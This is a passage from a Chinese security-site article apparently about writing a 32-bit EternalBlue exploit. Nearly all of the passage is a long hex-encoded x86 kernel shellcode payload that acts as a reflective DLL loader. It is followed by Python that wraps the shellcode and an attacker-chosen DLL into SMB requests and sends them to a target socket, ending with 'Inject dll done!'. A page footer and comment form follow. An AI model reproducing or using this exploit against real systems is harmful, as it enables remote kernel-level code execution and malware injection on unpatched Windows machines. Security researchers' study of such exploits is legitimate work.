00\x00\x85\xC0\x74\x54\x89\x45\xF0\x8B\x45\xFC\x8B\x4D\xF8\xE8\x0C\x01\x00\x00\x85\xC0\x74\x42\x89\x45\xEC\x8B\x45\xFC\x8B\x4D\xF8\xE8\x02\x01\x00\x00\x85\xC0\x74\x30\x89\x45\xE8\x8B\x45\xFC\x89\xF9\x8B\x55\xEC\x8B\x5D\xF4\xE8\xB0\x00\x00\x00\x83\xF8\xFF\x74\x21\x89\xC1\x8B\x45\xE8\xE8\xE4\x00\x00\x00\x66\x89\xC2\x8B\x45\xFC\x8B\x4D\xF0\xE8\xDE\x00\x00\x00\x83\xC4\x18\x5D\x5F\x59\x5A\x5B\xC3\x31\xC0\xEB\xF3\x56\x89\xC6\x83\xC6\x3C\x8B\x36\x01\xC6\x66\x81\x3E\x50\x45\x75\x09\x83\xC6\x78\x8B\x36\x01\xF0\x5E\xC3\x31\xC0\xEB\xFA\x56\x51\x57\x89\xC6\x31\xC0\x89\xC7\xC1\xE7\x07\x29\xC7\x89\xF8\x31\xC9\x8A\x0E\x80\xF9\x00\x74\x05\x01\xC8\x46\xEB\xE9\x5F\x59\x5E\xC3\x56\x57\x52\x89\xC6\x31\xC0\x89\xC7\xC1\xE7\x07\x29\xC7\x89\xF8\x31\xD2\x8A\x16\x01\xD0\x46\xE2\xEE\x5A\x5F\x5E\xC3\x56\x51\x57\x89\xC6\x31\xC0\x89\xC7\xC1\xE7\x07\x29\xC7\x89\xF8\x31\xC9\x8A\x0E\x80\xF9\x00\x74\xC6\x01\xC8\x46\x46\xEB\xE8\x5F\x59\x5E\xC3\x83\xC0\x18\x8B\x00\xC3\x57\x56\x51\x31\xFF\x89\xC6\x39\xDF\x74\x19\x8B\x04\xBA\x01\xF0\xE8\x83\xFF\xFF\xFF\x39\xC8\x74\x07\x47\xEB\xEB\x59\x5E\x5F\xC3\x89\xF8\xEB\xF8\xB8\xFF\xFF\xFF\xFF\xEB\xF1\x83\xC1\x1C\x8B\x09\x01\xC8\xC3\x83\xC1\x20\x8B\x09\x01\xC8\xC3\x83\xC1\x24\x8B\x09\x01\xC8\xC3\xD1\xE1\x01\xC8\x66\x8B\x00\xC3\x81\xE2\xFF\xFF\x00\x00\xC1\xE2\x02\x01\xD1\x8B\x09\x01\xC8\xC3\x70\x21\x00\x00\x60\x89\xE0\x81\xEC\x00\x04\x00\x00\xE9\x52\x0D\x00\x00\x5D\x8D\xB4\x24\x00\x02\x00\x00\x89\x06\x31\xFF\x64\x8B\x07\x89\x46\x04\x8D\x55\xC8\x31\xC9\x49\x64\xFF\x37\x56\x55\x51\x52\x52\x64\xFF\x37\x64\x89\x27\x8D\x7D\x9A\x56\x83\xC6\x08\x31\xC9\x8A\x0F\x84\xC9\x74\x30\x47\x8B\x17\x83\xC7\x04\x8B\x1F\x83\xC7\x04\x53\x52\xE8\x05\x0C\x00\x00\x51\x0F\xB6\x0F\x47\x85\xC9\x59\x75\x08\x85\xC0\x0F\x84\xED\x0B\x00\x00\x89\x06\x83\xC6\x04\x49\x85\xC9\x75\xD8\xEB\xC8\x5E\x56\x83\xEC\x1C\x31\xC0\x89\x44\x24\x18\x89\x44\x24\x14\x89\x44\x24\x10\x89\x44\x24\x0C\x89\x44\x24\x08\x64\x8B\x1D\x18\x00\x00\x00\x8B\x5B\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x73\x10\x89\xF2\x56\x89\xF7\x83\xC6\x3C\x03\x3E\x5E\x53\x89\xFB\x0F\xB7\x4B\x06\x0F\xB7\x43\x14\x5B\x85\xC9\x0F\x84\xE3\x00\x00\x00\x89\x4C\x24\x04\x57\x83\xC7\x18\x83\xC7\x60\x8B\x0F\x85\xC9\x74\x02\x01\xF1\x89\x4C\x24\x18\x8B\x4F\x04\x89\x4C\x24\x1C\x5F\x01\xC7\x83\xC7\x18\x89\x3C\x24\x89\xF8\x83\xC0\x24\x8B\x00\x25\x00\x00\x00\x20\x85\xC0\x0F\x84\x8C\x00\x00\x00\x89\xF9\x83\xC1\x08\x83\xC7\x0C\x8B\x09\x8B\x3F\x01\xF7\x83\xF9\x0D\x7C\x79\x83\xE9\x0D\x83\xC7\x07\x8B\x44\x24\x14\x85\xC0\x74\x16\x39\xC7\x72\x12\x03\x44\x24\x18\x39\xC7\x73\x0A\x01\xF9\x39\xC1\x76\x59\x29\xC1\x89\xC7\x8D\x44\x24\x0C\x50\xE8\x0D\x0A\x00\x00\x85\xC0\x74\x09\xE8\x7D\x0A\x00\x00\x85\xC0\x75\x06\x47\x49\xE3\x3A\xEB\xC5\x83\xF8\x02\x74\x0D\x8B\x44\x24\x08\x85\xC0\x75\xED\xB8\x01\x00\x00\x00\x89\x44\x24\x08\x56\x8B\x74\x24\x20\x89\x7E\x20\x8B\x44\x24\x14\x89\x46\x24\x8B\x44\x24\x10\x89\x46\x28\x5E\x8B\x44\x24\x08\x83\xF8\x01\x74\xC4\xEB\x40\x8B\x3C\x24\x8B\x4C\x24\x04\x83\xC7\x28\x83\xE9\x01\x85\xC9\x89\x3C\x24\x89\x4C\x24\x04\x0F\x85\x44\xFF\xFF\xFF\x31\xC0\x8B\x1B\x8B\x73\x10\x39\xC6\x74\xF5\x39\xF2\x74\x05\xE9\xEC\xFE\xFF\xFF\x8B\x04\x24\x85\xC0\x75\x09\x83\xC4\x1C\x5E\xE9\x88\x0A\x00\x00\x83\xC4\x1C\x5E\x56\x89\xF2\x89\xF7\x83\xC6\x08\x89\xF2\x83\xC7\x2C\xB9\x06\x00\x00\x00\xF3\xA5\x89\xD7\x8D\xB5\x03\xFD\xFF\xFF\xB9\x06\x00\x00\x00\x89\x37\x83\xC7\x04\x83\xC6\x04\xE2\xF6\x5E\xBA\x40\x00\x00\x00\x52\xBA\x00\x30\x00\x00\x52\xFF\x75\x03\x6A\x00\xFF\x56\x08\x85\xC0\x0F\x84\x53\x08\x00\x00\x89\xC3\x56\x8B\x4D\x03\x8D\x75\x0B\x89\xDF\xF3\xA4\x5E\x89\x5E\x44\x8B\x45\x03\x89\x46\x48\x8B\x4D\x03\x8D\x7D\x0B\x31\xC0\xF3\xAA\x8D\x85\x00\xFB\xFF\xFF\x89\x85\xCF\xF6\xFF\xFF\x8D\x85\x07\xFB\xFF\xFF\x89\x85\xD3\xF6\xFF\xFF\x8D\x85\x38\xFB\xFF\xFF\x89\x85\xDB\xF6\xFF\xFF\x8D\x85\x98\xFA\xFF\xFF\x89\x85\xDF\xF6\xFF\xFF\x8B\x7E\x28\x8D\x85\x17\xFB\xFF\xFF\xF7\xC7\x10\x00\x00\x00\x75\x01\x40\x89\x85\xD7\xF6\xFF\xFF\x55\x8D\xAD\x6A\xF6\xFF\xFF\x8B\x7E\x44\xE8\xBD\x01\x00\x00\x85\xC0\x0F\x85\xE5\x00\x00\x00\xE8\x17\x02\x00\x00\x85\xC0\x0F\x84\xD8\x00\x00\x00\x89\x45\x10\x8B\x7D\x04\x83\xC7\x34\x8B\x3F\x8B\x45\x10\x29\xF8\x89\x45\x14\xE8\x2E\x02\x00\x00\x85\xC0\x0F\x85\xB8\x00\x00\x00\xE8\x83\x02\x00\x00\x85\xC0\x0F\x85\xAB\x00\x00\x00\xE8\x75\x03\x00\x00\x85\xC0\x0F\x85\x9E\x00\x00\x00\xE8\x7A\x03\x00\x00\x85\xC0\x0F\x85\x91\x00\x00\x00\xE8\x23\x04\x00\x00\x85\xC0\x0F\x85\x84\x00\x00\x00\xE8\xE6\x04\x00\x00\x85\xC0\x75\x7B\x8B\x45\x10\x89\x46\x4C\x8B\x45\x0C\x89\x46\x50\x5D\x8B\x45\x07\x89\x46\x54\x8B\x7E\x4C\x8B\x56\x50\x83\xC2\x00\x8B\x12\x85\xD2\x74\x4B\x01\xD7\x8B\x46\x54\x89\xFA\x83\xC2\x10\x8B\x12\x29\xD0\x89\xFA\x83\xC2\x14\x8B\x12\x83\xF8\x00\x7C\x31\x39\xD0\x7D\x2D\x89\xFA\x83\xC2\x1C\x8B\x12\x03\x56\x4C\xC1\xE0\x02\x01\xC2\x8B\x12\x03\x56\x4C\x57\x89\xE7\x8B\x46\x44\x8B\x5E\x48\x53\x50\xB8\x02\x00\x00\x00\x50\xFF\xD2\x89\xFC\x5F\x89\x46\x58\x55\x8D\xAD\x6A\xF6\xFF\xFF\xE8\x4B\x04\x00\x00\xEB\x00\x8B\x7D\x10\x85\xFF\x74\x4A\x8D\x45\x61\x50\xB8\x40\x00\x00\x00\x50\x8B\x45\x28\x50\x8B\x45\x10\x50\xFF\x56\x1C\x85\xC0\x74\x07\x8B\x4D\x28\x31\xC0\xF3\xAA\x8B\x7D\x10\x68\x00\x80\x00\x00\x6A\x00\x57\xFF\x56\x0C\x8B\x7D\x30\x85\xFF\x74\x15\x8B\x4D\x34\x31\xC0\xF3\xAA\x8B\x7D\x30\x68\x00\x80\x00\x00\x6A\x00\x57\xFF\x56\x0C\x5D\xE9\x97\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xB8\xFF\xFF\xFF\xFF\xE9\x50\x09\x00\x00\x6D\x73\x76\x63\x72\x74\x2E\x64\x6C\x6C\x00\x6D\x73\x76\x63\x72\x74\x64\x2E\x64\x6C\x6C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x52\x53\x89\x7D\x00\x89\xFA\x83\xC2\x00\x66\x8B\x1A\x66\x81\xFB\x4D\x5A\x75\x4A\x89\xFA\x83\xC2\x3C\x8B\x1A\x01\xDF\x89\x7D\x04\x89\xFA\x83\xC2\x00\x8B\x1A\x81\xFB\x50\x45\x00\x00\x75\x2F\x89\xFA\x83\xC2\x18\x66\x8B\x1A\x66\x81\xFB\x0B\x01\x75\x20\x89\xFA\x83\xC2\x14\x31\xDB\x66\x8B\x1A\x89\xFA\x83\xC2\x18\x01\xDA\x89\x55\x08\x89\xFA\x83\xC2\x78\x89\x55\x0C\x31\xC0\xEB\x04\x31\xC0\xF7\xD0\x5B\x5A\x5F\xC3\x57\x52\x53\x8B\x7D\x04\x83\xC7\x50\x8B\x1F\x89\x5D\x28\x8B\x7D\x04\x83\xC7\x34\x8B\x17\x6A\x40\x68\x00\x30\x00\x00\x53\x52\xFF\x56\x08\x85\xC0\x75\x0D\x6A\x40\x68\x00\x30\x00\x00\x53\x6A\x00\xFF\x56\x08\x5B\x5A\x5F\xC3\x57\x52\x53\x51\x56\x8B\x76\x44\x8B\x7D\x10\x8B\x5D\x04\x83\xC3\x54\x8B\x0B\xF3\xA4\x5E\x8B\x7D\x04\x83\xC7\x06\x31\xDB\x66\x8B\x1F\x31\xD2\x39\xD3\x74\x2E\xB8\x28\x00\x00\x00\x52\xF7\xE2\x5A\x03\x45\x08\x56\x8B\x76\x44\x89\xC1\x83\xC1\x14\x03\x31\x8B\x7D\x10\x89\xC1\x83\xC1\x0C\x03\x39\x89\xC1\x83\xC1\x10\x8B\x09\xF3\xA4\x5E\x42\xEB\xCE\x31\xC0\xEB\x04\x31\xC0\xF7\xD0\x59\x5B\x5A\x5F\xC3\x57\x52\x53\x51\x8B\x7D\x10\xE8\xF4\xFE\xFF\xFF\x85\xC0\x0F\x85\xDE\x00\x00\x00\xE8\x40\x03\x00\x00\x85\xC0\x0F\x85\xD1\x00\x00\x00\x8B\x7D\x00\xB8\x08\x00\x00\x00\xBA\x01\x00\x00\x00\xF7\xE2\x8B\x55\x0C\x01\xC2\x83\xC2\x00\x8B\x1A\x01\xFB\x89\x5D\x18\x39\xFB\x0F\x84\xB1\x00\x00\x00\x89\xD8\x83\xC0\x10\x8B\x00\x85\xC0\x0F\x84\xA2\x00\x00\x00\x8B\x45\x00\x89\xDA\x83\xC2\x0C\x03\x02\x50\xFF\x56\x10\x85\xC0\x0F\x84\x86\x00\x00\x00\x89\x45\x24\x89\xDA\x83\xC2\x00\x8B\x7D\x00\x03\x3A\x89\x7D\x1C\x89\xDA\x83\xC2\x10\x8B\x7D\x00\x03\x3A\x89\x7D\x20\x8B\x55\x1C\x8B\x12\x85\xD2\x74\x58\x89\xD7\x81\xE7\x00\x00\x00\x80\x74\x0A\x89\xD7\x81\xE7\xFF\xFF\x00\x00\xEB\x08\x8B\x7D\x00\x01\xD7\x83\xC7\x02\x57\x8B\x7D\x24\x57\xFF\x56\x14\x85\xC0\x74\x38\x8B\x55\x20\x89\x02\xE8\xCD\x03\x00\x00\x85\xC0\x74\x0E\xE8\x88\x03\x00\x00\x85\xC0\x75\x05\xE8\x13\x03\x00\x00\x8B\x55\x1C\x83\xC2\x04\x89\x55\x1C\x8B\x55\x20\x83\xC2\x04\x89\x55\x20\xEB\x9F\x83\xC3\x14\xE9\x55\xFF\xFF\xFF\x31\xC0\xF7\xD0\xEB\x02\x31\xC0\x59\x5B\x5A\x5F\xC3\x57\x52\x8B\x7D\x04\x83\xC7\x34\x8B\x55\x10\x89\x17\x31\xC0\x5A\x5F\xC3\x57\x52\x53\x51\x8B\x55\x14\x85\xD2\x0F\x84\xA0\x00\x00\x00\xB8\x08\x00\x00\x00\xBA\x05\x00\x00\x00\xF7\xE2\x8B\x55\x0C\x01\xC2\x89\xD7\x83\xC7\x04\x8B\x3F\x85\xFF\x74\x7E\x89\xD7\x83\xC7\x00\x8B\x3F\x85\xFF\x74\x73\x8B\x55\x10\x01\xFA\x89\xD7\x83\xC7\x04\x8B\x3F\x85\xFF\x74\x69\x83\xEF\x08\xD1\xEF\x31\xC9\x39\xF9\x74\x4D\x89\xD3\x83\xC3\x08\x89\xC8\xD1\xE0\x01\xC3\xC7\x45\x2C\x00\x00\x00\x00\x66\x8B\x03\x66\x25\x00\xF0\x66\xC1\xE8\x0C\x66\x83\xF8\x00\x74\x27\x66\x83\xF8\x03\x75\x21\x89\xD0\x83\xC0\x00\x8B\x00\x89\x45\x2C\x31\xC0\x66\x8B\x03\x66\x25\xFF\x0F\x01\x45\x2C\x8B\x45\x10\x03\x45\x2C\x8B\x5D\x14\x01\x18\x41\xEB\xAF\x89\xD7\x83\xC7\x04\x8B\x3F\x01\xFA\xEB\x92\x31\xC0\xF7\xD0\xEB\x02\x31\xC0\x59\x5B\x5A\x5F\xC3\x57\x52\x53\x51\x8B\x7D\x04\x83\xC7\x06\x31\xDB\x66\x8B\x1F\x31\xD2\x39\xD3\x0F\x84\x92\x00\x00\x00\xB8\x28\x00\x00\x00\x52\xF7\xE2\x5A\x03\x45\x08\x89\xC7\x83\xC7\x24\x8B\x3F\xC7\x45\x5D\x00\x00\x00\x00\xF7\xC7\x00\x00\x00\x02\x75\x64\xF7\xC7\x00\x00\x00\x40\x74\x07\xC7\x45\x5D\x02\x00\x00\x00\xF7\xC7\x00\x00\x00\x80\x74\x07\xC7\x45\x5D\x04\x00\x00\x00\xF7\xC7\x00\x00\x00\x20\x74\x1A\x83\x7D\x5D\x02\x75\x07\xC7\x45\x5D\x20\x00\x00\x00\x83\x7D\x5D\x04\x75\x07\xC7\x45\x5D\x40\x00\x00\x00\x8B\x7D\x10\x89\xC1\x83\xC1\x0C\x03\x39\x89\xC1\x83\xC1\x08\x8B\x09\x52\x8D\x45\x61\x50\x8B\x45\x5D\x50\x51\x57\xFF\x56\x1C\x5A\x85\xC0\x74\x06\x42\xE9\x6C\xFF\xFF\xFF\x31\xC0\xF7\xD0\xEB\x02\x31\xC0\x59\x5B\x5A\x5F\xC3\x52\x57\x8B\x55\x10\x8B\x7D\x04\x83\xC7\x28\x8B\x3F\x01\xFA\x6A\x00\x6A\x00\x8B\x7D\x10\x57\xFF\xD2\x31\xC0\x5F\x5A\xC3\x52\x57\x8B\x55\x10\x8B\x7D\x04\x83\xC7\x28\x8B\x3F\x01\xFA\x6A\x00\x6A\x01\x8B\x7D\x10\x57\xFF\xD2\x31\xC0\x5F\x5A\xC3\x39\xEC\x7D\x79\x57\x56\x53\x89\xE6\x83\xC6\x0C\x55\x6A\x00\x89\xE3\x51\x52\x89\xE9\x29\xF1\x83\xF9\x04\x7C\x5A\x50\x52\x53\xB8\x0F\x00\x00\x00\x6B\xC0\x04\x39\xC8\x7D\x02\x89\xC1\xBA\x00\x00\x00\x00\x89\xC8\xBB\x04\x00\x00\x00\xF7\xFB\x48\x6A\x00\x83\xF8\x00\x75\xF8\x01\xCC\x5B\x5A\x58\x89\xE5\x89\xE7\x29\xCF\x89\xFC\xF3\xA4\x89\x23\x8B\x4B\xFC\x8B\x53\xF8\xC7\x43\xFC\x00\x00\x00\x00\xC7\x43\xF8\x00\x00\x00\x00\xC7\x04\x24\xFF\xFF\xFF\xFF\xBE\xEE\xEE\xEE\xEE\xFF\xE0\x59\x59\x5D\x5D\x5B\x5E\x5F\xFF\xE0\x5B\x89\xE1\x2B\x4D\x08\x83\xE9\x04\x89\xEC\x83\xC4\x20\x01\xCC\x8B\x5D\x10\x8B\x75\x14\x8B\x7D\x18\x8B\x4D\x1C\x8B\x6D\x0C\xFF\xE1\x00\x00\x00\x00\x57\x52\x53\x51\xB8\x08\x00\x00\x00\xBA\x0C\x00\x00\x00\xF7\xE2\x8B\x55\x0C\x01\xC2\x83\xC2\x04\x8B\x1A\xC1\xEB\x02\xB8\x0A\x00\x00\x00\xF7\xE3\x89\x45\x34\x6A\x40\x68\x00\x30\x00\x00\x50\x6A\x00\xFF\x56\x08\x85\xC0\x74\x4B\x89\x45\x30\x8B\x46\x20\x8B\x7D\x65\x83\xC7\x03\x89\x07\x8B\x46\x28\xA9\x02\x00\x00\x00\x74\x18\x8B\x45\x6D\x8B\x5D\x71\x89\x03\x8B\x5E\x24\x8B\x7D\x71\x29\xDF\x8B\x5D\x69\x43\x89\x3B\xEB\x09\x8B\x45\x6D\x8B\x7D\x69\x47\x89\x07\x8B\x46\x28\xA9\x01\x00\x00\x00\x74\x0E\x8B\x7D\x69\xC6\x07\xBF\xEB\x06\x31\xC0\xF7\xD0\xEB\x02\x31\xC0\x59\x5B\x5A\x5F\xC3\x57\x52\x53\x51\x56\x50\x8B\x7D\x30\x8B\x45\x38\x01\xC7\x89\xEE\x83\xC6\x3C\xB9\x0A\x00\x00\x00\xF3\xA4\x8B\x7D\x30\x8B\x45\x38\x01\xC7\x83\xC7\x00\x47\x8B\x55\x20\x8B\x1A\x89\x1F\x8B\x75\x75\x8B\x7D\x30\x8B\x45\x38\x01\xC7\x83\xC7\x05\x47\x83\xC7\x04\x29\xFE\x8B\x7D\x30\x8B\x45\x38\x01\xC7\x83\xC7\x05\x47\x89\x37\x8B\x7D\x30\x8B\x45\x38\x01\xC7\x8B\x75\x20\x89\x3E\x8B\x45\x38\x83\xC0\x0A\x89\x45\x38\x58\x5E\x59\x5B\x5A\x5F\xC3\x57\x52\x53\x51\x56\x8B\x7D\x00\x89\xDA\x83\xC2\x0C\x03\x3A\x89\xE9\x83\xC1\x46\x57\x51\xFF\x56\x18\x85\xC0\x74\x12\x89\xE9\x83\xC1\x51\x57\x51\xFF\x56\x18\x85\xC0\x74\x04\x31\xC0\xEB\x07\xB8\x01\x00\x00\x00\xEB\x00\x5E\x59\x5B\x5A\x5F\xC3\x57\x52\x53\x51\x56\x8B\x7D\x24\x89\xFA\x83\xC2\x00\x66\x8B\x1A\x66\x81\xFB\x4D\x5A\x75\x65\x89\xFA\x83\xC2\x3C\x8B\x1A\x01\xDF\x89\xFA\x83\xC2\x00\x8B\x1A\x81\xFB\x50\x45\x00\x00\x75\x4D\x89\xFE\x83\xC6\x14\x31\xDB\x66\x8B\x1E\x89\xFE\x83\xC6\x18\x01\xDE\x89\xFB\x83\xC3\x06\x31\xC9\x66\x8B\x0B\x31\xD2\x89\xF3\x83\xC3\x0C\x8B\x7D\x24\x03\x3B\x39\xF8\x7C\x1A\x89\xF3\x83\xC3\x08\x03\x3B\x39\xF8\x7D\x0F\x89\xF3\x83\xC3\x24\x8B\x1B\xF7\xC3\x00\x00\x00\x20\x75\x0C\x83\xC6\x28\x42\x39\xCA\x7C\xD0\x31\xC0\xEB\x07\xB8\x01\x00\x00\x00\xEB\x00\x5E\x59\x5B\x5A\x5F\xC3\xEB\x18\x6A\x0B\xEB\x16\x6A\x0C\xEB\x12\x6A\x0D\xEB\x0E\x6A\x0E\xEB\x0A\x6A\x0F\xEB\x06\x6A\x10\xEB\x02\xEB\x76\x58\x8B\x04\x86\x56\x57\x53\x55\x89\xF3\x89\xE6\x83\xC6\x14\xB9\x40\x00\x00\x00\x29\xCC\x89\xE7\xF3\xA4\x89\xE5\xE8\x00\x00\x00\x00\x5F\x89\xDE\x8B\x5E\x28\x50\x8D\x47\x3C\xF7\xC3\x10\x00\x00\x00\x75\x01\x40\xF7\xC3\x02\x00\x00\x00\x75\x04\x89\xC7\xEB\x0A\x8D\x7F\x51\x89\x07\x8B\x46\x24\x29\xC7\x58\xF7\xC3\x01\x00\x00\x00\x8B\x5E\x20\x53\x74\x02\xEB\x02\x89\xFE\xFF\xE0\x5B\x8B\x5D\x44\x8B\x7D\x48\x8B\x75\x4C\x8B\x4D\x50\x8B\x6D\x40\x83\xC4\x54\xFF\xE1\x00\x00\x00\x00\xE9\x52\x01\x00\x00\x55\x89\xE5\x53\x56\x51\x8B\x4D\x10\x0F\xB6\x01\x85\xC0\x74\x2C\x8B\x75\x08\x85\xF6\x8B\x75\x0C\x74\x02\x29\xC6\x0F\xB6\x06\x3C\xFF\x75\x14\x0F\xB6\x59\x01\x46\x0F\xB6\x06\x39\xD8\x72\x08\x0F\xB6\x59\x02\x39\xD8\x76\x09\x8D\x49\x03\xEB\xCD\x31\xC0\xEB\x03\x31\xC0\x40\x59\x5E\x5B\x89\xEC\x5D\xC2\x0C\x00\x8D\x85\x44\xFE\xFF\xFF\x50\x57\x31\xC0\x50\xE8\xA4\xFF\xFF\xFF\x85\xC0\x74\x49\x51\x8B\x4C\x24\x08\x31\xC0\x89\x41\x04\x0F\xB6\x47\x01\x24\x01\x89\xC1\x0F\xB6\x47\x01\x24\x10\x09\xC1\x0F\xB6\x47\x01\x3C\xD0\x77\x1D\x80\xC9\x02\x3C\x30\x72\x16\x51\x3C\x70\x72\x05\x8B\x4F\x02\xEB\x04\x0F\xBE\x4F\x02\x8B\x44\x24\x0C\x89\x48\x04\x59\x8B\x44\x24\x08\x89\x08\x59\x31\xC0\x40\xC2\x04\x00\x02\x26\x27\x03\x66\x67\x06\xA6\xA7\x02\xE6\xE7\x02\x16\x17\x03\x56\x57\x06\x96\x97\x02\xD6\xD7\x00\x8D\x85\xA6\xFE\xFF\xFF\x50\x57\x31\xC0\x40\x50\xE8\x2A\xFF\xFF\xFF\x85\xC0\x74\x07\xB8\x02\x00\x00\x00\xEB\x2C\x8D\x85\xC2\xFE\xFF\xFF\x50\x57\x31\xC0\x40\x50\xE8\x0E\xFF\xFF\xFF\x85\xC0\x74\x07\xB8\x01\x00\x00\x00\xEB\x10\x8D\x47\xFB\x8A\x00\x3C\xE8\xB8\x01\x00\x00\x00\x74\x02\x31\xC0\xC3\x02\x10\x13\x03\x14\x14\x02\x16\x17\x03\x50\x53\x04\x54\x54\x03\x55\x57\x06\x90\x93\x06\x95\x97\x02\xD0\xD7\x00\x06\x15\x15\x02\x18\x1B\x03\x1C\x1C\x06\x1D\x1D\x02\x1E\x1F\x03\x58\x5B\x04\x5C\x5C\x03\x5D\x5F\x07\x94\x94\x06\x98\x9B\x07\x9C\x9C\x06\x9D\x9F\x02\xD8\xDF\x00\xE9\xCF\x00\x00\x00\x5E\xE9\xC9\x00\x00\x00\x31\xC0\x60\xB0\x18\x64\x8B\x18\x8B\x5B\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x73\x28\x8B\x6B\x10\x85\xED\x0F\x84\x82\x00\x00\x00\x31\xD2\xC1\xC2\x05\x66\xAD\x0C\x20\x30\xC2\x66\x83\x3E\x00\x75\xF1\x8B\x1B\x3B\x54\x24\x24\x75\xD9\x8B\x44\x24\x28\x85\xC0\x75\x04\x89\xE8\xEB\x59\x8B\x7D\x3C\x01\xEF\x8B\x7F\x78\x01\xEF\x39\xEF\x74\x4F\x8B\x4F\x18\x85\xC9\x74\x48\x8B\x57\x1C\x01\xEA\x8B\x5F\x20\x01\xEB\x8B\x7F\x24\x01\xEF\x89\x54\x24\x24\x8B\x33\x01\xEE\x31\xD2\xC1\xC2\x05\xAC\x0C\x20\x30\xC2\x80\x3E\x00\x75\xF3\x3B\x54\x24\x28\x74\x0A\x83\xC7\x02\x83\xC3\x04\xE2\xDF\xEB\x12\x0F\xB7\x17\xC1\xE2\x02\x03\x54\x24\x24\x8B\x02\x01\xE8\x89\x44\x24\x1C\x61\xC2\x08\x00\x06\xDF\xB0\x2C\x51\x33\x8A\x8D\xA4\x00\x78\x95\x27\x85\x00\x3B\x00\xA1\xB4\x00\xDB\xB6\xB6\xE5\x00\xC4\x22\x07\xE2\x00\x82\x5A\x15\x4A\x00\x00\x31\xC0\x8B\x4E\x04\x64\x89\x08\xEB\x04\x8B\x64\x24\x08\x83\xC4\x10\x5D\x5E\x31\xC0\x64\x8F\x00\x8B\x26\x89\x44\x24\x1C\x31\xC0\x8D\x4D\x00\x8D\x5D\xFB\x29\xD9\x89\xDF\xF3\xAA\x8D\x4D\xF7\x8D\x9D\x9C\xF2\xFF\xFF\x29\xD9\x89\xDF\xF3\xAA\x61\xC3\xE8\xA9\xF2\xFF\xFF\xEB\x09\x90\x00\x14\x00\x00\x01\x00\x00\x00&quot;
f&nbsp;=&nbsp;open(dllfile,&quot;rb&quot;)
dll_hex&nbsp;=&nbsp;f.read()
f.close()
dll_hex&nbsp;+=&nbsp;&quot;\x00&quot;*3
array&nbsp;,&nbsp;ncount&nbsp;=&nbsp;make_smb_request(kernel_shellcode&nbsp;+&nbsp;dll_hex,key)
for&nbsp;i&nbsp;in&nbsp;range(ncount):
#print&nbsp;binascii.b2a_hex(array[i])
print&nbsp;i+4,&quot;,len:&quot;,len(array[i])
s.sendall(array[i])
data&nbsp;=&nbsp;s.recv(1024)
print&nbsp;i+4,&quot;---&gt;&quot;,data
#end1
step_7_data&nbsp;=&quot;\x00\x00\x00\x23\xFF\x53\x4D\x42\x71\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08\x42\x00\x00\x00\x00&quot;
s.sendall(step_7_data)
data&nbsp;=&nbsp;s.recv(1024)
print&nbsp;7,data
#end2
step_8_data&nbsp;=&quot;\x00\x00\x00\x27\xFF\x53\x4D\x42\x74\x00\x00\x00\x00\x18\x07\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE\x00\x08\x42\x00\x02\xFF\x00\x27\x00\x00\x00&quot;
s.sendall(step_8_data)
data&nbsp;=&nbsp;s.recv(1024)
print&nbsp;8,data
print&nbsp;&quot;------Inject&nbsp;dll&nbsp;done!------&quot;
s.close()</pre><p style="text-indent: 2em;"><br/></p><p><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/4012.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】EternalBlue之32位exploit编写(一) - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="4012" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/2x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="16357" user-name="Mickey牛" href="javascript:;">
                Mickey牛            </a>
                        <span class="comment-time">2017-08-30 11:18:22</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16357">回复</a></span>&nbsp;|&nbsp;
